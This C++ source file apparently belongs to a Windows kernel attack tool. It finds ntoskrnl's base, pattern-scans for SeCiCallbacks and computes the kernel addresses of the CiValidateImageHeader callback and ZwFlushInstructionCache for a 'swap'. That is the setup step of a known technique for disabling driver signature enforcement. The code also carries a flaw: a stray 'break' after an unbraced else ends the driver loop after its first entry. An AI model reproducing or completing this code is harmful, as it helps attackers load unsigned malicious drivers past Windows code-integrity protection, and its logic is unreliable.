#include "includes.h"
#include <DbgHelp.h>

bool modules::EnumerateKernelModules( const std::wstring& targetModuleName )
{
    constexpr DWORD maxDrivers = { 1024 };
    LPVOID drivers[maxDrivers];
    DWORD cbNeeded = { 0 };

    // Query loaded kernel drivers
    std::printf( "[*] Enumerating Loaded Drivers...\n" );

    if ( !EnumDeviceDrivers( drivers, sizeof( drivers ), &cbNeeded ) || cbNeeded > sizeof( drivers ) ) return false;

    std::this_thread::sleep_for( std::chrono::milliseconds( 300 ) );

    int cDrivers = cbNeeded / sizeof( LPVOID );

    for ( int i = 0; i < cDrivers; ++i ) {
        TCHAR szDriverName[MAX_PATH] = { 0 };

        if ( GetDeviceDriverBaseNameW( drivers[i], szDriverName, MAX_PATH ) ) {

            if ( helpers::match_ascii_icase( szDriverName, targetModuleName.c_str() ) ) {
                globals::nt_base = ( ULONG_PTR )drivers[i];
                return true;
            }
        } else
            std::wcerr << L"[!] Failed to get driver base name for driver at: " << drivers[i] << std::endl; break;
    }    
    return false; // Failed, just return false
}

seCiCallbacks_swap modules::get_CIValidate_ImageHeaderEntry() {
    std::wcout << L"[*] Searching Pattern...\n";

    if ( !modules::EnumerateKernelModules( L"ntoskrnl.exe" ) ) {
        std::printf( "[!] Failed to enumerate kernel modules.\n" );
        return seCiCallbacks_swap{ 0 };
    }

    ULONG_PTR mod_base = ( ULONG_PTR )globals::nt_base;
    std::printf( "[*] Kernel Base Address: %p (0x%llx)\n", ( void* )mod_base, ( unsigned long long )mod_base );

    HINSTANCE usermode_load_va = LoadLibraryEx( L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES );
    if ( !usermode_load_va ) {
        std::printf( "[!] Failed to load usermode ntoskrnl.exe\n" );
        return seCiCallbacks_swap{ 0 };
    }
    DWORD64 uNtAddr = ( DWORD64 )usermode_load_va;
    std::printf( "[*] Usermode ntoskrnl base: %p\n", ( void* )uNtAddr );
    MODULEINFO modinfo{};
    if ( !GetModuleInformation( GetCurrentProcess(), usermode_load_va, &modinfo, sizeof( modinfo ) ) ) {
        std::printf( "[!] Failed to get module information\n" );
        return seCiCallbacks_swap{ 0 };
    }
    std::printf( "[*] Image Size: 0x%llx\n", ( unsigned long long )modinfo.SizeOfImage );

    // Find all matches for the pattern
    unsigned char pattern[] = { 0xff, 0x48, 0x8b, 0xd3, 0x4c, 0x8d, 0x05 };
    const char* mask = "xxx????";
    const size_t offsetAfterMatch = 4;

    auto matches = helpers::find_lea_rax_patterns(
        ( DWORD64 )usermode_load_va,
        modinfo.SizeOfImage,
        pattern,
        mask,
        offsetAfterMatch
    );

    if ( matches.empty() ) {
        std::printf( "[!] Pattern not found\n" );
        return seCiCallbacks_swap{ 0 };
    }

    std::printf( "[*] SeCiCallbacks usermode VA: 0x%p\n", matches[0].address );

    DWORD64 offset = matches[0].address - uNtAddr;
    std::printf( "[*] Offset in image: 0x%llx\n", offset );

    DWORD64 seCiCallbacksKernel = mod_base + offset;
    std::printf( "[*] SeCiCallbacks kernel VA: 0x%llx\n", seCiCallbacksKernel );

    DWORD64 zwFlushUser = ( DWORD64 )helpers::GetProcAddress( ( void* )usermode_load_va, L"ZwFlushInstructionCache" );
    if ( !zwFlushUser ) {
        std::printf( "[!] Failed to get ZwFlushInstructionCache address\n" );
        return seCiCallbacks_swap{ 0 };
    }

    DWORD64 zwFlushOffset = zwFlushUser - uNtAddr;
    DWORD64 zwFlushKernel = mod_base + zwFlushOffset;
    std::printf( "[*] ZwFlushInstructionCache kernel VA: 0x%llx\n", zwFlushKernel );

    DWORD64 ciValidateImageHeaderEntry = seCiCallbacksKernel + 0x20;
    std::printf( "[*] ciValidateImageHeaderEntry kernel VA: 0x%llx\n", ciValidateImageHeaderEntry );

    system( "pause" );

    return seCiCallbacks_swap{ ciValidateImageHeaderEntry, zwFlushKernel };
}


helpers::EntryPointInfo helpers::GetEntryPoint( HMODULE moduleBase ) {
    if ( !moduleBase )
        return { 0, 0 };

    unsigned char* base = reinterpret_cast< unsigned char* >( moduleBase );

    auto* dosHeader = reinterpret_cast< IMAGE_DOS_HEADER* >( base );
    if ( dosHeader->e_magic != IMAGE_DOS_SIGNATURE )
        return { 0, 0 };

    auto* ntHeaders = reinterpret_cast< PIMAGE_NT_HEADERS64 >( base + dosHeader->e_lfanew );
    if ( !ntHeaders || ntHeaders->Signature != IMAGE_NT_SIGNATURE )
        return { 0, 0 };

    if ( ntHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC ||
        ntHeaders->OptionalHeader.SizeOfImage < 0x100000 ||
        ntHeaders->FileHeader.NumberOfSections < 20 ) {
        return { 0, 0 };
    }

    globals::nt_base2 = ntHeaders->OptionalHeader.ImageBase;

    uintptr_t rva = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    uintptr_t absVA = reinterpret_cast< uintptr_t >( base + rva );

    return { absVA, rva };
}
